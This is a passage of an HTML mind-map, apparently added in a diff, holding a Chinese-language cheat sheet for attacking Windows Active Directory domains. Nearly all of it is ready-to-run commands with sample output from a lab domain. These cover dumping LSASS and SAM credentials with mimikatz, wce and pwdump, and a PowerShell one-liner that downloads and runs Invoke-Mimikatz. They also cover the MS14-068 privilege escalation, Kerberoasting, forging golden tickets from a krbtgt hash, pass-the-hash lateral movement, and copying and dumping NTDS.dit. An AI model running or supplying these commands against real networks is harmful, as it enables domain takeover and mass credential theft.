+<ul id="fold1_39" style="POSITION: relative; VISIBILITY: visible;"><li><p><span style="color: #111111;">net group /domain &#65288;&#26597;&#30475;&#22495;&#20013;&#32452;&#65289;
+<br>
+\\WIN-1OQO62UPUD5.ruos.org &#30340;&#32452;&#24080;&#25143;
+<br>
+-------------------------------------------------------------------------------
+<br>
+*DnsUpdateProxy
+<br>
+*Domain Admins
+<br>
+*Domain Computers
+<br>
+*Domain Controllers
+<br>
+*Domain Guests
+<br>
+*Domain Users
+<br>
+*IT &#65288;&#36825;&#26159;&#25105;&#33258;&#24049;&#21152;&#30340;&#32452;&#65289;
+<br>
+
+<br>
+&#21152;&#20837;&#22495;&#20013;&#30340;&#25152;&#26377;&#24037;&#20316;&#32452; &#65288;&#36825;&#26159;&#40664;&#35748;&#32452;&#27880;&#37322;&#65289;
+<br>
+net group "domain computers" /domain
+<br>
+&#25351;&#23450;&#30340;&#22495;&#31649;&#29702;&#21592;
+<br>
+net group "Domain Admins" /domain
+<br>
+&#22495;&#20013;&#25152;&#26377;&#22495;&#25511;&#21046;&#22120;
+<br>
+net group "Domain Controllers" /domain
+<br>
+&#25152;&#26377;&#22495;&#29992;&#25143;
+<br>
+net group "Domain Users" /domain
+<br>
+Very useful link:
+<br>
+https://technet.microsoft.com/en-us/library/cc754051%28v=ws.11%29.aspx</span>
+</li>
+</ul><p><span id="show1_40" class="foldclosed" onClick="show_folder('1_40')" style="POSITION: absolute">+</span> <span id="hide1_40" class="foldopened" onClick="hide_folder('1_40')">-</span>
+<span style="color: #111111;">Csvde
+<br>
+Imports and exports data from Active Directory Domain Services (AD DS) </span>
+<ul id="fold1_40" style="POSITION: relative; VISIBILITY: visible;"><li><span style="color: #111111;">&#xa;    <p style="margin-bottom: 0; margin-left: 0; padding-bottom: 0; padding-right: 0; font-style: normal; padding-left: 0; font-weight: normal; margin-right: 0; margin-top: 0; padding-top: 0">&#xa;      -r &#25628;&#32034;&#36807;&#28388;&#xa;    </p>&#xa;    <p style="margin-bottom: 0; margin-left: 0; padding-bottom: 0; font-style: normal; padding-right: 0; padding-left: 0; font-weight: normal; margin-right: 0; margin-top: 0; padding-top: 0">&#xa;      csvde -r (&amp;(objectClass=User)(sn=Surname)&#xa;    </p>&#xa;    <table border="0" style="border-right-style: solid; border-top-style: solid; border-left-style: solid; border-right-width: 0; border-top-width: 0; border-bottom-style: solid; width: 80%; border-left-width: 0; border-bottom-width: 0">&#xa;      &#xa;    </table>&#xa;    <p style="margin-bottom: 0; padding-bottom: 0; margin-left: 0; font-style: normal; padding-right: 0; padding-left: 0; font-weight: normal; margin-right: 0; margin-top: 0; padding-top: 0">&#xa;      &#23548;&#20986;user&#23545;&#35937;&#xa;    </p>&#xa;    <p style="margin-bottom: 0; padding-bottom: 0; margin-left: 0; font-style: normal; padding-right: 0; padding-left: 0; font-weight: normal; margin-right: 0; margin-top: 0; padding-top: 0">&#xa;      csvde -r objectClass=user -f usersonly.csv&#xa;    </p>&#xa;    <table border="0" style="border-right-style: solid; border-top-style: solid; border-left-style: solid; border-right-width: 0; border-top-width: 0; border-bottom-style: solid; width: 80%; border-left-width: 0; border-bottom-width: 0">&#xa;      &#xa;    </table>&#xa;    <p style="margin-bottom: 0; padding-bottom: 0; margin-left: 0; font-style: normal; padding-right: 0; padding-left: 0; font-weight: normal; margin-right: 0; margin-top: 0; padding-top: 0">&#xa;      &#23548;&#20986;&#25351;&#23450;OU&#xa;    </p>&#xa;    <p style="margin-bottom: 0; padding-bottom: 0; margin-left: 0; font-style: normal; padding-right: 0; padding-left: 0; font-weight: normal; margin-right: 0; margin-top: 0; padding-top: 0">&#xa;      csvde -d &quot;ou=marketing,dc=contoso,dc=com&quot; -f marketingobjects.csv&#xa;    </p>&#xa;    <table border="0" style="border-right-style: solid; border-top-style: solid; border-left-style: solid; border-right-width: 0; border-top-width: 0; border-bottom-style: solid; width: 80%; border-left-width: 0; border-bottom-width: 0">&#xa;      &#xa;    </table>&#xa;    <p style="margin-bottom: 0; padding-bottom: 0; margin-left: 0; font-style: normal; padding-right: 0; padding-left: 0; font-weight: normal; margin-right: 0; margin-top: 0; padding-top: 0">&#xa;      -l &#31579;&#36873;&#25351;&#23450;&#23646;&#24615;&#xa;    </p>&#xa;    <p style="margin-bottom: 0; padding-bottom: 0; margin-left: 0; font-style: normal; padding-right: 0; padding-left: 0; font-weight: normal; margin-right: 0; margin-top: 0; padding-top: 0">&#xa;      csvde -f search.txt -p subtree -l SamAccountName,CN,Distinguishname&#xa;    </p>&#xa;    <table border="0" style="border-right-style: solid; border-top-style: solid; border-left-style: solid; border-right-width: 0; border-top-width: 0; border-bottom-style: solid; width: 80%; border-left-width: 0; border-bottom-width: 0">&#xa;      &#xa;    </table>&#xa;    <p style="margin-bottom: 0; padding-bottom: 0; margin-left: 0; font-style: normal; padding-right: 0; padding-left: 0; font-weight: normal; margin-right: 0; margin-top: 0; padding-top: 0">&#xa;      &#23548;&#20986;&#25152;&#26377;&#xa;    </p>&#xa;    <p style="margin-bottom: 0; padding-bottom: 0; margin-left: 0; font-style: normal; padding-right: 0; padding-left: 0; font-weight: normal; margin-right: 0; margin-top: 0; padding-top: 0">&#xa;      csvde -f output.csv<br >&#xa;    </p>&#xa;  </span>
+</li>
+</ul><p><span id="show1_41" class="foldclosed" onClick="show_folder('1_41')" style="POSITION: absolute">+</span> <span id="hide1_41" class="foldopened" onClick="hide_folder('1_41')">-</span>
+<span style="color: #111111;">Ldifde
+<br>
+Creates, modifies, and deletes directory objects. </span>
+<ul id="fold1_41" style="POSITION: relative; VISIBILITY: visible;"><li><p><span style="color: #111111;">Ldifde -d dc=fabrikam,dc=com -r (objectClass=User) -l distinguishedname,cn,givenname,sn,telephone &#8211;f ldifde.txt</span>
+</li>
+</ul><p><span id="show1_42" class="foldclosed" onClick="show_folder('1_42')" style="POSITION: absolute">+</span> <span id="hide1_42" class="foldopened" onClick="hide_folder('1_42')">-</span>
+<span style="color: #111111;">ADExplorer
+<br>
+Active Directory Explorer (AD Explorer) is an advanced Active Directory (AD) viewer and editor. </span>
+<ul id="fold1_42" style="POSITION: relative; VISIBILITY: visible;"><li><span style="color: #111111;">https://technet.microsoft.com/en-us/sysinternals/bb963907.aspx</span>
+
+</li>
+
+</ul></li>
+</ul>
+</li>
+<li><span style="color: #111111;">&#26597;&#35810;&#22495;&#20449;&#20219;&#20851;&#31995;</span>
+<ul><li><span style="color: #111111;">&#26415;&#35821;</span>
+<ul><li><span style="color: #111111;">PDC (primary domain controller)
+<br>
+BDC (backup domain controller)
+<br>
+SAM (Security Accounts Manager) </span>
+
+</li>
+
+</ul>
+</li>
+<li><span id="show1_43" class="foldclosed" onClick="show_folder('1_43')" style="POSITION: absolute">+</span> <span id="hide1_43" class="foldopened" onClick="hide_folder('1_43')">-</span>
+<span style="color: #111111;">Nltest</span>
+<ul id="fold1_43" style="POSITION: relative; VISIBILITY: visible;"><li><p><span style="color: #111111;">/domain_trusts &nbsp;Returns a list of trusted domains.
+<br>
+/dclist: &lt;DomainName&gt; &nbsp;Lists all domain controllers in the domain.
+<br>
+/dcname: &lt;DomainName&gt; &nbsp;Lists the primary domain controller or the PDC emulator for DomainName.
+<br>
+/dsgetdc: &lt;DomainName&gt; Queries the Domain Name System (DNS) server for a list of domain controllers and their corresponding IP addresses.
+<br>
+/dnsgetdc: &lt;DomainName&gt; Queries the DNS server for a list of domain controllers and their corresponding IP addresses.
+<br>
+/parentdomain Returns the name of the parent domain of the server.
+<br>
+/dsgetfti: &lt;DomainName&gt; &nbsp;Returns information about interforest trusts.</span>
+</li>
+</ul>
+</li>
+<li><span style="color: #111111;">Netdom </span>
+
+</li>
+
+</ul>
+</li>
+<li><span style="color: #111111;">&#25235;&#21462;&#29992;&#25143;&#23494;&#30721;</span>
+<ul><li><span style="color: #111111;">mimikatz
+<br>
+https://adsecurity.org/?page_id=1821</span>
+<ul><li><p><span style="color: #111111;">&#33719;&#21462;&#20869;&#23384;&#25991;&#20214;&#65288;&#25105;&#26368;&#21916;&#27426;&#30340;&#26041;&#24335;&#65292;&#26080;&#27602;&#26080;&#27531;&#30041;&#65289;
+<br>
+Procdump.exe -accepteula -ma lsass.exe lsass.dmp
+<br>
+mimikatz&#23548;&#20986;&#23494;&#30721;
+<br>
+mimikatz log "sekurlsa::minidump lsass.dmp" "sekurlsa::logonPasswords full" exit
+<br>
+or
+<br>
+mimikatz &nbsp;log "privilege::debug" "sekurlsa::logonpasswords" exit
+<br>
+
+<br>
+Powershell&#33050;&#26412;Invoke-Mimikatz.ps1
+<br>
+&#20462;&#25913;&#33050;&#26412;&#25191;&#34892;&#31574;&#30053;&#65288;&#20165;&#31649;&#29702;&#21592;&#65289;
+<br>
+set-ExecutionPolicy RemoteSigned
+<br>
+
+<br>
+powershell -exec bypass Import-Module .\Invoke-Mimikatz.ps1;Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::logonPasswords full"'
+<br>
+
+<br>
+powershell "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds" 
+<br>
+
+<br>
+&#22914;&#26524;&#29992;&#25143;&#26435;&#38480;&#19981;&#22815;&#65292;&#23581;&#35797;&#25552;&#26435;&#21040;nt authority\system</span>
+<p>lsadump::dcsync /user:user1 /domain:ruos.org
+<p>Windows Server 2012
+<ul><li><p>reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1
+</li>
+</ul></li>
+</ul>
+</li>
+<li><span id="show1_44" class="foldclosed" onClick="show_folder('1_44')" style="POSITION: absolute">+</span> <span id="hide1_44" class="foldopened" onClick="hide_folder('1_44')">-</span>
+<span style="color: #111111;">wce</span>
+<ul id="fold1_44" style="POSITION: relative; VISIBILITY: visible;"><li><span style="color: #111111;">&#23548;&#20986;&#26126;&#25991;&#23494;&#30721;
+<br>
+wce.exe -w -o wce_hash.txt
+<br>
+&#21015;&#20986;&#30331;&#38470;session&#21644;NTLM &#20973;&#25454;
+<br>
+wce.exe -l</span>
+
+</li>
+
+</ul>
+</li>
+<li><span id="show1_45" class="foldclosed" onClick="show_folder('1_45')" style="POSITION: absolute">+</span> <span id="hide1_45" class="foldopened" onClick="hide_folder('1_45')">-</span>
+<span style="color: #111111;">Pwdump</span>
+<ul id="fold1_45" style="POSITION: relative; VISIBILITY: visible;"><li><p><span style="color: #111111;">pwdump is the name of various Windows programs that output the LM and NTLM password hashes of local user accounts from the Security Account Manager (SAM).
+<br>
+pwdump7.exe &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(Dump system passwords)
+<br>
+pwdump7.exe -s &lt;samfile&gt; &lt;systemfile&gt; &nbsp;&nbsp;&nbsp;(Dump passwords from files)
+<br>
+http://www.openwall.com/passwords/windows-pwdump</span>
+</li>
+</ul>
+</li>
+<li><span id="show1_46" class="foldclosed" onClick="show_folder('1_46')" style="POSITION: absolute">+</span> <span id="hide1_46" class="foldopened" onClick="hide_folder('1_46')">-</span>
+<span style="color: #111111;">GetHashes.exe
+<br>
+&#20320;&#21487;&#20197;&#22312;SAMInside&#20013;&#25214;&#21040;&#27492;&#24037;&#20855;&#21253;</span>
+<ul id="fold1_46" style="POSITION: relative; VISIBILITY: visible;"><li><p><span style="color: #111111;">GetSyskey &#8211;&nbsp;extracts SYSKEY from the SYSTEM registry file and saves it to a separate 16-byte file. 
+<br>
+GetHashes &#8211;&nbsp;gets user hashes using SAM registry file and SYSKEY. 
+<br>
+LoginRecoveryToPWDUMP &#8211;&nbsp;converts hashes from the Login Recovery to PWDUMP format. 
+<br>
+PasswordToSyskey &#8211;&nbsp;generates SYSKEY using provided password. 
+<br>
+
+<br>
+&#24403;GetHashes.exe $Local&#26080;&#25928;&#26102;&#35831;&#36873;&#25321;GetHashes.exe &lt;SAM Registry File&gt; [Syskey File]&#26041;&#24335;
+<br>
+&#23548;&#20986;sam&#65292;system&#27880;&#20876;&#34920;&#39033;
+<br>
+reg save hklm\sam sam.hiv
+<br>
+reg save hklm\system system.hiv
+<br>
+&#29983;&#25104;SYSKEY
+<br>
+GetSyskey.exe system.hiv
+<br>
+&#23548;&#20986;Hash
+<br>
+GetHashes.exe sam.hiv StartKey.key</span>
+</li>
+</ul>
+</li>
+<li><span style="color: #111111;">gsecdump etc</span>
+
+</li>
+
+</ul>
+</li>
+<li><span style="color: #111111;">&#25915;&#20987;&#22495;&#25511;</span>
+<ul><li><span id="show1_47" class="foldclosed" onClick="show_folder('1_47')" style="POSITION: absolute">+</span> <span id="hide1_47" class="foldopened" onClick="hide_folder('1_47')">-</span>
+<span style="color: #111111;">MS14-068
+<br>
+&#35813;&#28431;&#27934;&#20801;&#35768;&#25552;&#21319;&#26222;&#36890;&#22495;&#29992;&#25143;&#36134;&#25143;&#20026;&#22495;&#31649;&#29702;&#21592;&#36134;&#25143;</span>
+<ul id="fold1_47" style="POSITION: relative; VISIBILITY: visible;"><li><p><span style="color: #111111;">&#20197;&#26222;&#36890;&#22495;&#29992;&#25143;user1&#30331;&#38470;
+<br>
+whoami /user
+<br>
+&#29992;&#25143;&#21517; &nbsp;&nbsp;&nbsp;&nbsp;SID
+<br>
+========== ============================================
+<br>
+ruos\user1 S-1-5-21-847212966-3984301783-330558867-1139
+<br>
+&#21629;&#20196;:
+<br>
+ms14-068.py -u &lt;userName&gt;@&lt;domainName&gt; -s &lt;userSid&gt; -d &lt;domainControlerAddr&gt;
+<br>
+OPTIONS:
+<br>
+ -p &lt;clearPassword&gt;
+<br>
+ --rc4 &lt;ntlmHash&gt;
+<br>
+&#29983;&#25104;TGT&#25991;&#20214;&#25991;&#20214;
+<br>
+ms14-068.py -u user1@ruos.org -s S-1-5-21-847212966-3984301783-330558867-1139 -d WIN-1OQO62UPUD5.ruos.org -p Test@1234 
+<br>
+[+] Creating ccache file 'TGT_user1@ruos.org.ccache'... Done!
+<br>
+&#28165;&#38500;&#32531;&#23384;&#35777;&#20070;&#65288;&#22495;&#29992;&#25143;&#30331;&#38470;&#19979;&#65289;
+<br>
+klist purge
+<br>
+&#21019;&#24314;&#39640;&#26435;&#38480;&#32531;&#23384;&#35777;&#20070;
+<br>
+mimikatz.exe "kerberos::ptc TGT_user1@ruos.org.ccache" exit
+<br>
+ * Injecting ticket : OK
+<br>
+&#20320;&#21487;&#20197;&#26597;&#30475;&#19979;&#35777;&#20070;
+<br>
+klist tickets
+<br>
+&#20351;&#29992;
+<br>
+net use \\WIN-1OQO62UPUD5.ruos.org\c$
+<br>
+Learn more:
+<br>
+https://technet.microsoft.com/library/security/ms14-068.aspx
+<br>
+http://www.freebuf.com/vuls/56081.html
+<br>
+https://github.com/gentilkiwi/kekeo/</span>
+</li>
+</ul>
+</li>
+<li><span id="show1_48" class="foldclosed" onClick="show_folder('1_48')" style="POSITION: absolute">+</span> <span id="hide1_48" class="foldopened" onClick="hide_folder('1_48')">-</span>
+SPN (Service Principal Names)
+<ul id="fold1_48" style="POSITION: relative; VISIBILITY: visible;"><li><p>&#33719;&#21462;&#22495;&#36134;&#21495;
+<br>
+setspn -T domain -q */*
+<br>
+GetUserSPNs.ps1
+<br>
+&#35831;&#27714;&#31080;&#25454;
+<br>
+PS C:\&gt; Add-Type -AssemblyName System.IdentityModel
+<br>
+PS C:\&gt; New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/WEBTST01.ruos.org:1433" &nbsp;
+<br>
+&#23548;&#20986;&#31080;&#25454;
+<br>
+mimikatz # kerberos::list /export
+<br>
+&#20174;&#31080;&#25454;&#20013;&#23548;&#20986;hash
+<br>
+kirbi2john.py 1-40a00000-user2@MSSQLSvc~WEBTST01.ruos.org~SQLEXPRESS-RUOS.ORG.kirbi
+<br>
+&#31163;&#32447;&#30772;&#35299;
+<br>
+hashcat64.exe -m 13100 hash.txt example.dict &#8211;force
+<br>
+
+<br>
+https://cfdb.io/Windows/Weak_SPN_Password
+</li>
+</ul>
+</li>
+<li>GPP&#32452;&#31574;&#30053;&#20559;&#22909;
+
+</li>
+<li><span style="color: #111111;">Golden Ticket&#32500;&#25345;&#35775;&#38382;</span>
+<ul><li><p><span style="color: #111111;">1&#65289;&#33719;&#21462;&#29992;&#25143;SID
+<br>
+c:\&gt; PsGetsid.exe -accepteula user1&#65288;or whoami /user&#65289;
+<br>
+SID for RUOS\user1:
+<br>
+S-1-5-21-847212966-3984301783-330558867-1139
+<br>
+2&#65289;&#33719;&#21462;krbtgt&#29992;&#25143;&#30340;NTLM hash
+<br>
+mimikatz.exe log "lsadump::dcsync /domain:ruos.org /user:krbtgt" exit
+<br>
+krbtgt:502:AAD3B435B51404EEAAD3B435B51404EE:A12D099D2568214DCF53FE047E1715F6:::
+<br>
+3&#65289;&#29983;&#25104;&#31080;&#25454;
+<br>
+mimikatz # kerberos::golden /admin:Administrator /domain:ruos.org /sid:S-1-5-21-847212966-3984301783-330558867 /krbtgt:A12D099D2568214DCF53FE047E1715F6 /ticket:Administrator.kiribi
+<br>
+4&#65289;Pass-the-ticket
+<br>
+mimikatz # kerberos::ptt Administrator.kiribi
+<br>
+&#65288;&#22914;&#26524;&#19981;&#24819;&#20445;&#23384;&#31080;&#25454; kerberos::golden /admin:Administrator /domain:ruos.org /sid:S-1-5-21-847212966-3984301783-330558867 /krbtgt:A12D099D2568214DCF53FE047E1715F6 /ptt&#65289;
+<br>
+5&#65289;&#36830;&#25509;
+<br>
+net use \\WIN-1OQO62UPUD5.ruos.org\c$
+<br>
+</span>
+<p>&#38750;&#22495;&#25104;&#21592;PTT
+<br>
+1&#65289; python ticketer.py -nthash A12D099D2568214DCF53FE047E1715F6 -domain-sid S-1-5-21-847212966-3984301783-330558867 -domain ruos.org user1
+<br>
+2&#65289;&#35774;&#32622;&#29615;&#22659;&#21464;&#37327;
+<br>
+windows&#65306;
+<br>
+set KRB5CCNAME=D:\user1.ccache
+<br>
+Linux&#65306;
+<br>
+export KRB5CCNAME=/path/user1.ccache
+<br>
+echo $KRB5CCNAME
+<br>
+3&#65289;&#35774;&#32622;hosts
+<br>
+hosts
+<br>
+192.168.6.2 ruos.org
+<br>
+192.168.6.2 WIN-1OQO62UPUD5
+<br>
+4&#65289;&#25191;&#34892;
+<br>
+psexec.py user1@WIN-1OQO62UPUD5 -k -no-pass -debug
+</li>
+</ul>
+</li>
+<li><span style="color: #111111;"> Silver Tickets</span>
+
+</li>
+<li>&#31038;&#24037;&#27450;&#39575;
+
+</li>
+<li><span id="show1_49" class="foldclosed" onClick="show_folder('1_49')" style="POSITION: absolute">+</span> <span id="hide1_49" class="foldopened" onClick="hide_folder('1_49')">-</span>
+Pass The Hash
+<ul id="fold1_49" style="POSITION: relative; VISIBILITY: visible;"><li><p>1) wmiexec.py
+<br>
+wmiexec.py -hashes 00000000000000000000000000000000:CFFE330D774D003D94291F4E19FD56C1 RUOS/admin@192.168.6.2 "whoami"
+<br>
+2) mimikatz
+<br>
+privilege::debug
+<br>
+sekurlsa::pth /user:admin /domain:RUOS /ntlm:CFFE330D774D003D94291F4E19FD56C1 "/run:mstsc.exe /restrictedadmin"
+<br>
+
+<br>
+dir \\192.168.6.2\c$
+<br>
+psexec &nbsp;\\192.168.6.2 cmd.exe
+<br>
+
+<br>
+3) smbmap.py
+<br>
+smbmap.py -u &nbsp;RUOS\admin -p aad3b435b51404eeaad3b435b51404ee:CFFE330D774D003D94291F4E19FD56C1 -d RUOS -H 192.168.6.2
+<br>
+4) psexec.py
+<br>
+python psexec.py administrator@192.168.6.2 -hashes 00000000000000000000000000000000:CFFE330D774D003D94291F4E19FD56C1
+<br>
+5) Server 2012 hash&#30331;&#38470;&#36828;&#31243;&#26700;&#38754;
+<br>
+&#23458;&#25143;&#31471;&#38656;&#24320;&#21551;&#21463;&#38480;&#27169;&#24335;
+<br>
+Restricted Admin mode for RDP
+<br>
+REG ADD "HKLM\System\CurrentControlSet\Control\Lsa" /v DisableRestrictedAdmin /t REG_DWORD /d 00000000 /f
+<br>
+
+<br>
+xfreerdp -u administrator -p CFFE330D774D003D94291F4E19FD56C1 192.168.6.2
+<br>
+
+<br>
+https://labs.portcullis.co.uk/tools/freerdp-pth/
+</li>
+</ul>
+</li>
+
+</ul>
+</li>
+
+</ul>
+</li>
+<li><span style="color: #111111;">DNS&#26381;&#21153;&#22120;</span>
+<ul><li><span id="show1_50" class="foldclosed" onClick="show_folder('1_50')" style="POSITION: absolute">+</span> <span id="hide1_50" class="foldopened" onClick="hide_folder('1_50')">-</span>
+<span style="color: #111111;">Dnscmd &#65288;&#23548;&#20986;dns&#20449;&#24687;&#65289;
+<br>
+A command-line interface for managing DNS servers. </span>
+<ul id="fold1_50" style="POSITION: relative; VISIBILITY: visible;"><li><p><span style="color: #111111;">dnscmd &lt;ServerName&gt; &lt;command&gt; [&lt;command parameters&gt;]
+<br>
+dnscmd /zoneexport	Writes the resource records of a zone to a text file.
+<br>
+dnscmd /enumrecords	Lists the resource records in a zone.
+<br>
+dnscmd /enumzones	Lists the zones hosted by the specified server.
+<br>
+dnscmd /info	Gets server information.
+<br>
+dnscmd /zoneinfo	Displays zone information.
+<br>
+dnscmd /zoneprint	Displays all records in the zone.
+<br>
+
+<br>
+dnscmd /zoneexport contoso.com 11.txt
+<br>
+&#40664;&#35748;&#23384;&#25918;&#20110;C:\Windows\system32\dns\ &#65292;&#22914;&#26524;&#27809;&#20889;&#20837;&#26435;&#38480;&#23558;&#36335;&#24452;&#20999;&#25442;&#21040;..\temp\11.txt
+<br>
+Download this file:
+<br>
+https://www.microsoft.com/en-us/download/details.aspx?id=7911</span>
+</li>
+</ul>
+</li>
+
+</ul>
+</li>
+<li><span style="color: #111111;">NTDS</span>
+<ul><li><span id="show1_51" class="foldclosed" onClick="show_folder('1_51')" style="POSITION: absolute">+</span> <span id="hide1_51" class="foldopened" onClick="hide_folder('1_51')">-</span>
+<span style="color: #111111;">SYSKEY </span>
+<ul id="fold1_51" style="POSITION: relative; VISIBILITY: visible;"><li><p><span style="color: #111111;">&#23548;&#20986;&#27880;&#20876;&#34920;&#65288;&#37197;&#21512;ntds.dit&#20351;&#29992;&#65289;
+<br>
+reg save hklm\system system.hiv
+<br>
+
+<br>
+getsyskey_c.exe &#33719;&#21462;SYSKEY
+<br>
+SYSKEY&#23454;&#38469;&#19978;&#23601;&#26159;HKLM\SYSTEM\CurrentControlSet\Control\Lsa&#19979;&#38754;&#20960;&#20010;&#23376;&#39033;&#30340;&#31867;&#22411;&#20449;&#24687;&#65292;&#21487;&#20197;&#29992;RegQueryInfoKey&#26597;&#35810;&#20986;&#26469;&#12290;
+<br>
+
+<br>
+SYSTEM&#25991;&#20214;
+<br>
+C:\Windows\System32\config\SYSTEM
+<br>
+</span>
+</li>
+</ul>
+</li>
+<li><span style="color: #111111;">&#25335;&#36125;ntds.dit&#25991;&#20214;</span>
+<ul><li><p><span id="show1_52" class="foldclosed" onClick="show_folder('1_52')" style="POSITION: absolute">+</span> <span id="hide1_52" class="foldopened" onClick="hide_folder('1_52')">-</span>
+<span style="color: #111111;">Ntdsutil snapshot
+<br>
+Manages snapshots of the volumes that contain the Active Directory database and log files.</span>
+<ul id="fold1_52" style="POSITION: relative; VISIBILITY: visible;"><li><p><span style="color: #111111;">&#21019;&#24314;&#24555;&#29031;&#38598;&#65288;&#35760;&#19979;&#21019;&#24314;&#30340;&#24555;&#29031;&#38598;GUID&#65289;
+<br>
+ntdsutil &nbsp;snapshot &nbsp;"activate &nbsp;instance &nbsp;ntds" &nbsp;create &nbsp;quit &nbsp;quit
+<br>
+&#21015;&#20986;&#25152;&#26377;&#24555;&#29031;&#38598;
+<br>
+ntdsutil &nbsp;snapshot "list all" quit quit
+<br>
+&#25346;&#36733;&#24555;&#29031;&#38598;&#65288;&#35760;&#19979;&#25346;&#36733;&#28857;&#65289;
+<br>
+ntdsutil &nbsp;snapshot &nbsp;"mount {GUID}" &nbsp;quit &nbsp;quit
+<br>
+&#21015;&#20986;&#25152;&#26377;&#25346;&#36733;&#28857;
+<br>
+ntdsutil &nbsp;snapshot &nbsp;"List Mounted" &nbsp;quit &nbsp;quit
+<br>
+&#25335;&#36125;&#24555;&#29031;&#38598;&#37324;&#30340;ntds.dit&#25991;&#20214;
+<br>
+copy &nbsp;C:\$SNAP_&#25346;&#36733;&#28857;_VOLUMEC$\windows\NTDS\ntds.dit &nbsp;c:\ntds.dit
+<br>
+&#21368;&#36733;&#25346;&#36733;&#28857;
+<br>
+ntdsutil &nbsp;snapshot &nbsp;"unmount {GUID}" &nbsp;quit &nbsp;quit
+<br>
+&#21024;&#38500;&#24555;&#29031;&#38598;
+<br>
+ntdsutil &nbsp;snapshot &nbsp;"delete {GUID}" &nbsp;quit &nbsp;quit
+<br>
+
+<br>
+https://technet.microsoft.com/en-us/library/cc731620%28v=ws.11%29.aspx
+<br>
+</span>
+</li>
+</ul><p><span id="show1_53" class="foldclosed" onClick="show_folder('1_53')" style="POSITION: absolute">+</span> <span id="hide1_53" class="foldopened" onClick="hide_folder('1_53')">-</span>
+<span style="color: #111111;">vshadow
+<br>
+Volume Shadow Copy sample client.</span>
+<ul id="fold1_53" style="POSITION: relative; VISIBILITY: visible;"><li><p><span style="color: #111111;">&#21019;&#24314;&#21367;&#24433;&#65288;&#35760;&#24405; - Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy20&#65289;
+<br>
+vss642008r2.exe -p -nw c:
+<br>
+&#25335;&#36125;ntds.dit&#21040;&#24403;&#21069;&#30446;&#24405;
+<br>
+copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy20\windows\ntds\ntds.dit .
+<br>
+&#22914;&#26524;&#20320;&#30495;&#30340;&#24456;&#25042;&#30340;&#35805;
+<br>
+shadowcopy.exe C:\Windows\NTDS\ntds.dit &nbsp;C:\ /s
+<br>
+Download&#65306;
+<br>
+http://edgylogic.com/blog/vshadow-exe-versions/</span>
+</li>
+</ul><p><span style="color: #111111;">vssown.vbs</span>
+</li>
+</ul>
+</li>
+<li><span style="color: #111111;">&#23548;&#20986;&#22495;Hash</span>
+<ul><li><span id="show1_54" class="foldclosed" onClick="show_folder('1_54')" style="POSITION: absolute">+</span> <span id="hide1_54" class="foldopened" onClick="hide_folder('1_54')">-</span>
+<span style="color: #111111;">NTDSDump</span>
+<ul id="fold1_54" style="POSITION: relative; VISIBILITY: visible;"><li><p><span style="color: #111111;">&#20462;&#22797;&#25968;&#25454;&#24211;
+<br>
+esentutl /p /o ntds.dit
+<br>
+&#23548;&#20986;hash
+<br>
+ntdsdump.exe &lt;-f ntds.dit&gt; &lt;-k HEX-SYS-KEY | -s system.hiv&gt; [-o out.txt]
+<br>
+&#32570;&#28857;&#65306;&#24403;ntds.dit&#25991;&#20214;&#36229;&#36807;1G&#26102;&#20250;&#20986;&#29616;&#20869;&#23384;&#19981;&#36275;&#38169;&#35823;&#65292;&#20351;&#29992;QuarksPwDump-0.3a.zip&#65288;2b&#29256;&#26412;&#20063;&#26377;&#36825;&#20010;&#38382;&#39064;&#65289;&#35299;&#20915;&#12290;</span>
+</li>
+</ul>
+</li>
+<li><span id="show1_55" class="foldclosed" onClick="show_folder('1_55')" style="POSITION: absolute">+</span> <span id="hide1_55" class="foldopened" onClick="hide_folder('1_55')">-</span>
+<span style="color: #111111;">QuarksPwDump</span>
+<ul id="fold1_55" style="POSITION: relative; VISIBILITY: visible;"><li><p><span style="color: #111111;">- Dump domain hashes from NTDS.dit with its history
+<br>
+quarks-pwdump.exe --dump-hash-domain --with-history -sf SYSTEM -nt ntds.dit -o hash.txt
+<br>
+
+<br>
+https://github.com/quarkslab/quarkspwdump</span>
+</li>
+</ul>
+</li>
+<li><span id="show1_56" class="foldclosed" onClick="show_folder('1_56')" style="POSITION: absolute">+</span> <span id="hide1_56" class="foldopened" onClick="hide_folder('1_56')">-</span>
+<span style="color: #111111;">NTDSXTract</span>
+<ul id="fold1_56" style="POSITION: relative; VISIBILITY: visible;"><li><span style="color: #111111;">&#25105;&#21457;&#35475;&#65292;&#20320;&#32477;&#23545;&#19981;&#20250;&#24819;&#29992;&#23427;&#30340;&#12290;</span>
+
+</li>
+
+</ul>
+</li>
+<li>secretsdump.py
+<ul><li>secretsdump.py -ntds ntds.dit -system system.hiv LOCAL
+
+</li>
+
+</ul>
+</li>
+
+</ul>
+</li>
+<li><span style="color: #111111;">&#30772;&#35299;Hash</span>
+<ul><li><span id="show1_57" class="foldclosed" onClick="show_folder('1_57')" style="POSITION: absolute">+</span> <span id="hide1_57" class="foldopened" onClick="hide_folder('1_57')">-</span>
+<span style="color: #111111;">&#22312;&#32447;&#30772;&#35299;</span>
+<ul id="fold1_57" style="POSITION: relative; VISIBILITY: visible;"><li><span style="color: #111111;">http://www.objectif-securite.ch/en/ophcrack.php </span>
+
+</li>
+<li><span style="color: #111111;">http://www.cmd5.com/</span>
+
+</li>
+<li><span style="color: #111111;">http://www.onlinehashcrack.com/hash-cracking.php</span>
+
+</li>
+
+</ul>
+</li>
+<li><span id="show1_58" class="foldclosed" onClick="show_folder('1_58')" style="POSITION: absolute">+</span> <span id="hide1_58" class="foldopened" onClick="hide_folder('1_58')">-</span>
+<span style="color: #111111;">&#26412;&#22320;&#30772;&#35299;</span>
